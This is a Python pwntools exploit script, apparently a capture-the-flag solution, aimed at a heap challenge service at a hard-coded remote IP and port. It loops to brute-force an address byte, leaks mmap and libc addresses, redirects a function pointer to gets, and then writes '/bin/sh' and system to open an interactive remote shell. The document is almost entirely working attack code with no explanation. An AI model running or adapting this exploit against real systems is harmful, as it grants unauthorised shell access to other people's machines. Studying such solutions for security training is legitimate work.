#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import time
#host = "10.211.55.8"
#port = 8888

host = "202.120.7.193"
port = 7777

#It need to brute force about 1 byte

while 1:
    def box(size):
        r.recvuntil("Command:")
        r.sendline("2")
        r.recvuntil(":")
        r.sendline(str(size))

    def store(size,s):
        r.recvuntil(" Command:")
        r.sendline("3")
        r.recvuntil(":")
        r.sendline(str(size))
        r.recvuntil(":")
        r.sendline(s)

    def storebox():
        r.recvuntil(" Command:")
        r.sendline("3")

    def getbox(idx):
        r.recvuntil(" Command:")
        r.sendline("4")
        r.recvuntil(":")
        r.sendline(str(idx))

    def getegg():
        r.recvuntil(" Command:")
        r.sendline("1")

    def delbox():
        r.recvuntil(" Command:")
        r.recvuntil("5")

    #r = process("./gc")
    r= remote(host,port)
    box(131032)
    store(560,"c"*560)
    getbox(0)
    getegg()
    getegg()
    storebox()
    box(0)
    box(0)
    getegg()
    store(16,p64(0xffffffffffffff81L) + p64(0))
    getegg()
    storebox()
    storebox()
    storebox()
    r.recvuntil("Command:")
    r.sendline("6")
    r.recvuntil("the length:")
    r.sendline("0")
    r.recvuntil("the length:")
    r.sendline("0")
    r.recvuntil("(size = ")
    data = int(r.recvuntil(")")[:-1].strip())
    print data
    if data < 0 :
        data  += 0x100000000
    print hex((( 0x7fae << 8*4 ) + data ))
    #mmap = (( 0x7f42 << 8*4 ) + data ) - 0xdf728b
    mmap = (( 0x7fae << 8*4 ) + data ) - 0x2c3  
    libc = mmap - 0xced000
    print "mmap:",hex(mmap)
    print "libc:",hex(libc)
    r.recvuntil("length:")
    r.sendline(str(0x85))
    #system = libc +0x46590
    system = libc +0x0000000000041490
    #gets = libc +  0x6f370
    gets = libc +  0x6b080
    payload = "\x00"*0x1f + p64(gets)
    payload = payload.ljust(0x85,"\x00")
    r.sendline(payload)
    buf = mmap + 0x368 
    s = r.recvuntil("Box (size = 0):", timeout=1)
    r.recvuntil('\n')
    try :
            #if not s:
            #    r.interactive()
            #    exit()
        payload = p64(buf) + p64(buf-0x68) + p64(0)*8 + "/bin/sh\x00" + p64(0) + p64(system) + p64(0)
        r.sendline(payload)
        time.sleep(0.1)
        r.sendline('ls')
        r.recv()

        r.interactive()
    except EOFError:
        continue
    except KeyboardInterrupt:
        raise
    finally:
        r.close()

